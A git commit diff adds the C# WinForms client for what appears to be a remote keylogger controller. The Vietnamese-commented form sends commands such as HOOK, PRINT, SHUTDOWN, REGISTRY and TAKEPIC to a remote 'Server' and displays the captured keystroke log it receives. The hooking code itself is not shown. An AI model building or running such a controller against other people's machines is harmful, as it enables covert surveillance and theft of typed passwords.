decea6484dfbf1f59c3266654841084dfbc45f32
jsapalebluedot <phuongthuynguyentran50@gmail.com>
2025-12-09 15:01:09 +0700

    Initial upload of new clean project

---
+++ client/keylog.Designer.cs
@@ -0,0 +1,177 @@
+﻿namespace client
+{
+    partial class keylog
+    {
+        /// <summary>
+        /// Required designer variable.
+        /// </summary>
+        private System.ComponentModel.IContainer components = null;
+
+        /// <summary>
+        /// Clean up any resources being used.
+        /// </summary>
+        /// <param name="disposing">true if managed resources should be disposed; otherwise, false.</param>
+        protected override void Dispose(bool disposing)
+        {
+            if (disposing && (components != null))
+            {
+                components.Dispose();
+            }
+            base.Dispose(disposing);
+        }
+
+        #region Windows Form Designer generated code
+
+        /// <summary>
+        /// Required method for Designer support - do not modify
+        /// the contents of this method with the code editor.
+        /// </summary>
+
+        private void InitializeComponent()
+        {
+            this.txtKQ = new System.Windows.Forms.RichTextBox();
+            this.button1 = new System.Windows.Forms.Button();
+            this.button2 = new System.Windows.Forms.Button();
+            this.button3 = new System.Windows.Forms.Button();
+            this.butXoa = new System.Windows.Forms.Button();
+            // KHAI BÁO CÁC NÚT ĐIỀU KHIỂN BỔ SUNG
+            this.btnShutdown = new System.Windows.Forms.Button();
+            this.btnRegistry = new System.Windows.Forms.Button();
+            this.btnProcess = new System.Windows.Forms.Button();
+            this.btnTakePic = new System.Windows.Forms.Button();
+
+            this.SuspendLayout();
+            // 
+            // txtKQ
+            // 
+            this.txtKQ.Enabled = false;
+            this.txtKQ.Location = new System.Drawing.Point(12, 77);
+            this.txtKQ.Name = "txtKQ";
+            this.txtKQ.Size = new System.Drawing.Size(400, 182);
+            this.txtKQ.TabIndex = 0;
+            this.txtKQ.Text = "";
+            // 
+            // button1 (HOOK)
+            // 
+            this.button1.Location = new System.Drawing.Point(12, 13);
+            this.button1.Name = "button1";
+            this.button1.Size = new System.Drawing.Size(75, 58);
+            this.button1.TabIndex = 1;
+            this.button1.Text = "HOOK";
+            this.button1.UseVisualStyleBackColor = true;
+            this.button1.Click += new System.EventHandler(this.button1_Click);
+            // 
+            // button2 (UNHOOK)
+            // 
+            this.button2.Location = new System.Drawing.Point(93, 13);
+            this.button2.Name = "button2";
+            this.button2.Size = new System.Drawing.Size(75, 58);
+            this.button2.TabIndex = 2;
+            this.button2.Text = "UNHOOK";
+            this.button2.UseVisualStyleBackColor = true;
+            this.button2.Click += new System.EventHandler(this.button2_Click);
+            // 
+            // button3 (PRINT)
+            // 
+            this.button3.Location = new System.Drawing.Point(174, 13);
+            this.button3.Name = "button3";
+            this.button3.Size = new System.Drawing.Size(75, 58);
+            this.button3.TabIndex = 3;
+            this.button3.Text = "PRINT";
+            this.button3.UseVisualStyleBackColor = true;
+            this.button3.Click += new System.EventHandler(this.button3_Click);
+            // 
+            // butXoa
+            // 
+            this.butXoa.Location = new System.Drawing.Point(255, 13);
+            this.butXoa.Name = "butXoa";
+            this.butXoa.Size = new System.Drawing.Size(75, 58);
+            this.butXoa.TabIndex = 4;
+            this.butXoa.Text = "Xóa";
+            this.butXoa.UseVisualStyleBackColor = true;
+            this.butXoa.Click += new System.EventHandler(this.butXoa_Click);
+
+            // 
+            // btnShutdown (TẮT MÁY)
+            // 
+            this.btnShutdown.Location = new System.Drawing.Point(336, 13);
+            this.btnShutdown.Name = "btnShutdown";
+            this.btnShutdown.Size = new System.Drawing.Size(75, 58);
+            this.btnShutdown.TabIndex = 5;
+            this.btnShutdown.Text = "TẮT MÁY";
+            this.btnShutdown.UseVisualStyleBackColor = true;
+            this.btnShutdown.Click += new System.EventHandler(this.btnShutdown_Click);
+
+            // 
+            // btnRegistry
+            // 
+            this.btnRegistry.Location = new System.Drawing.Point(12, 270);
+            this.btnRegistry.Name = "btnRegistry";
+            this.btnRegistry.Size = new System.Drawing.Size(75, 58);
+            this.btnRegistry.TabIndex = 6;
+            this.btnRegistry.Text = "REGISTRY";
+            this.btnRegistry.UseVisualStyleBackColor = true;
+            this.btnRegistry.Click += new System.EventHandler(this.btnRegistry_Click);
+
+            // 
+            // btnProcess
+            // 
+            this.btnProcess.Location = new System.Drawing.Point(93, 270);
+            this.btnProcess.Name = "btnProcess";
+            this.btnProcess.Size = new System.Drawing.Size(75, 58);
+            this.btnProcess.TabIndex = 7;
+            this.btnProcess.Text = "PROCESS";
+            this.btnProcess.UseVisualStyleBackColor = true;
+            this.btnProcess.Click += new System.EventHandler(this.btnProcess_Click);
+
+            // 
+            // btnTakePic
+            // 
+            this.btnTakePic.Location = new System.Drawing.Point(174, 270);
+            this.btnTakePic.Name = "btnTakePic";
+            this.btnTakePic.Size = new System.Drawing.Size(75, 58);
+            this.btnTakePic.TabIndex = 8;
+            this.btnTakePic.Text = "TAKE PIC";
+            this.btnTakePic.UseVisualStyleBackColor = true;
+            this.btnTakePic.Click += new System.EventHandler(this.btnTakePic_Click);
+
+            // 
+            // keylog
+            // 
+            this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
+            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
+            this.ClientSize = new System.Drawing.Size(424, 340); // Tăng kích thước cửa sổ để chứa các nút mới
+
+            this.Controls.Add(this.btnTakePic);
+            this.Controls.Add(this.btnProcess);
+            this.Controls.Add(this.btnRegistry);
+            this.Controls.Add(this.btnShutdown);
+            this.Controls.Add(this.butXoa);
+            this.Controls.Add(this.button3);
+            this.Controls.Add(this.button2);
+            this.Controls.Add(this.button1);
+            this.Controls.Add(this.txtKQ);
+            this.Name = "keylog";
+            this.Text = "Keystroke Remote Control";
+            this.FormClosing += new System.Windows.Forms.FormClosingEventHandler(this.keylog_closing);
+            this.ResumeLayout(false);
+
+        }
+
+        #endregion
+
+        private System.Windows.Forms.RichTextBox txtKQ;
+        private System.Windows.Forms.Button button1;
+        private System.Windows.Forms.Button button2;
+        private System.Windows.Forms.Button button3;
+        private System.Windows.Forms.Button butXoa;
+
+        // KHAI BÁO CÁC NÚT ĐIỀU KHIỂN BỔ SUNG
+        private System.Windows.Forms.Button btnShutdown;
+        private System.Windows.Forms.Button btnRegistry;
+        private System.Windows.Forms.Button btnProcess;
+        private System.Windows.Forms.Button btnTakePic;
+    }
+
+
+}
---
+++ client/keylog.cs
@@ -0,0 +1,189 @@
+﻿using System;
+using System.Windows.Forms;
+using System.IO;
+
+namespace client
+{
+    // Giả định tên Form của bạn là 'keylog'
+    public partial class keylog : Form
+    {
+        public keylog()
+        {
+            InitializeComponent();
+        }
+
+        // --- Nút KEYLOG / HOOK (Giả định là button1) ---
+        private void button1_Click(object sender, EventArgs e) // Hook
+        {
+            if (Program.nw != null)
+            {
+                // 1. Gửi lệnh chuyển Server vào chế độ KEYLOG
+                Program.nw.WriteLine("KEYLOG"); Program.nw.Flush();
+
+                // 2. Gửi lệnh HOOK để Server bắt đầu ghi phím
+                Program.nw.WriteLine("HOOK"); Program.nw.Flush();
+
+                MessageBox.Show("Đã gửi lệnh HOOK. Keylogger đang chạy trên Server.");
+            }
+        }
+
+        // --- Nút UNHOOK (Giả định là button2) ---
+        private void button2_Click(object sender, EventArgs e) // Unhook
+        {
+            if (Program.nw != null)
+            {
+                // Gửi lệnh UNHOOK để Server dừng ghi phím
+                Program.nw.WriteLine("UNHOOK"); Program.nw.Flush();
+                MessageBox.Show("Đã gửi lệnh UNHOOK. Keylogger đã tạm dừng.");
+            }
+        }
+
+        // --- Nút PRINT LOG (Giả định là button3) ---
+        private void button3_Click(object sender, EventArgs e) // Print Log
+        {
+            if (Program.nw != null)
+            {
+
+                // Gửi lệnh chuyển Server vào chế độ KEYLOG
+                Program.nw.WriteLine("KEYLOG"); Program.nw.Flush();
+                // Gửi lệnh PRINT để Server gửi nội dung log file
+                Program.nw.WriteLine("PRINT"); Program.nw.Flush();
+
+                String? logContent;
+
+                try
+                {
+
+                    if (Program.nr != null)
+                    {
+
+                        // Đọc dữ liệu log (Server gửi bằng WriteLine)
+                        logContent = Program.nr.ReadLine();
+
+                        if (!string.IsNullOrEmpty(logContent))
+                        {
+                            // Nếu bạn có RichTextBox tên là txtKQ:
+                            // txtKQ.Text += logContent; 
+
+                            // Hiển thị log qua MessageBox cho mục đích demo nhanh:
+                            MessageBox.Show("Đã nhận Log: \n" + logContent, "Log Keylogger");
+                        }
+                        else
+                        {
+                            MessageBox.Show("Không có log mới hoặc đã xảy ra lỗi mạng.");
+                        }
+                    }
+                }
+                catch (Exception ex)
+                {
+                    MessageBox.Show($"Lỗi nhận Log: {ex.Message}");
+                }
+            }
+        }
+
+        private void btnShutdown_Click(object sender, EventArgs e)
+        {
+            if (Program.nw != null)
+            {
+
+                // Chức năng: Gửi lệnh SHUTDOWN đến Server
+                String s = "SHUTDOWN";
+                try
+                {
+                    Program.nw.WriteLine(s);
+                    Program.nw.Flush();
+                    MessageBox.Show("Đã gửi lệnh TẮT MÁY (Shutdown) đến Server.", "Lệnh đã gửi", MessageBoxButtons.OK, MessageBoxIcon.Information);
+                }
+                catch (Exception ex)
+                {
+                    MessageBox.Show("Lỗi khi gửi lệnh Shutdown: " + ex.Message, "Lỗi mạng", MessageBoxButtons.OK, MessageBoxIcon.Error);
+                }
+            }
+        }
+
+        private void btnRegistry_Click(object sender, EventArgs e)
+        {
+            if (Program.nw != null)
+            {
+
+                // Chức năng: Gửi lệnh REGISTRY (Giả định Server có logic xử lý)
+                String s = "REGISTRY";
+                try
+                {
+                    Program.nw.WriteLine(s);
+                    Program.nw.Flush();
+                    MessageBox.Show("Đã gửi lệnh REGISTRY đến Server.", "Lệnh đã gửi", MessageBoxButtons.OK, MessageBoxIcon.Information);
+                }
+                catch (Exception ex)
+                {
+                    MessageBox.Show("Lỗi khi gửi lệnh Registry: " + ex.Message, "Lỗi mạng", MessageBoxButtons.OK, MessageBoxIcon.Error);
+                }
+            }
+        }
+
+        private void btnProcess_Click(object sender, EventArgs e)
+        {
+            if (Program.nw != null)
+            {
+
+                // Chức năng: Gửi lệnh PROCESS (Giả định Server có logic xử lý)
+                String s = "PROCESS";
+                try
+                {
+                    Program.nw.WriteLine(s);
+                    Program.nw.Flush();
+                    MessageBox.Show("Đã gửi lệnh PROCESS đến Server.", "Lệnh đã gửi", MessageBoxButtons.OK, MessageBoxIcon.Information);
+                }
+                catch (Exception ex)
+                {
+                    MessageBox.Show("Lỗi khi gửi lệnh Process: " + ex.Message, "Lỗi mạng", MessageBoxButtons.OK, MessageBoxIcon.Error);
+                }
+            }
+        }
+
+        private void btnTakePic_Click(object sender, EventArgs e)
+        {
+            if (Program.nw != null)
+            {
+
+                // Chức năng: Gửi lệnh TAKE PIC (Giả định Server có logic xử lý)
+                String s = "TAKEPIC";
+                try
+                {
+                    Program.nw.WriteLine(s);
+                    Program.nw.Flush();
+                    MessageBox.Show("Đã gửi lệnh CHỤP ẢNH (Take Pic) đến Server.", "Lệnh đã gửi", MessageBoxButtons.OK, MessageBoxIcon.Information);
+                }
+                catch (Exception ex)
+                {
+                    MessageBox.Show("Lỗi khi gửi lệnh Take Pic: " + ex.Message, "Lỗi mạng", MessageBoxButtons.OK, MessageBoxIcon.Error);
+                }
+            }
+        }
+
+        private void butXoa_Click(object sender, EventArgs e)
+        {
+            // Chức năng: Xóa nội dung RichTextBox (Chỉ hoạt động trên Client)
+            txtKQ.Text = "";
+        }
+        // --- Hàm Xóa Text (Giả định butXoa đã được tạo trong Designer) ---
+
+
+        // --- Lệnh SHUTDOWN (Bạn cần tạo nút này trong Form Designer) ---
+
+        private void keylog_closing(object sender, FormClosingEventArgs e)
+        {
+            if (Program.nw != null)
+            {
+                Program.nw.WriteLine("QUIT");
+                Program.nw.Flush();
+            }
+
+            if (Program.client != null)
+            {
+                Program.client.Close();
+                Program.client = null; // optional: đảm bảo không bị dùng lại
+            }
+        }
+    }
+}
